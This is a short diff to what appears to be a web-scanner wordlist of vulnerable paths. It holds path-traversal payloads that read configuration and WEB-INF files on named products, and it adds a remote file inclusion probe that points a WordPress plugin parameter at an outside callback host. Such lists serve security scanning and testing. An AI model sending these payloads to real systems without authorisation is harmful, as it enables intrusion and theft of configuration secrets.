@@ -184,3 +184,6 @@
 /brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/
 /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
 /system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
+{{paths}}
+/cgi-bin/ExportSettings.sh
+/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/
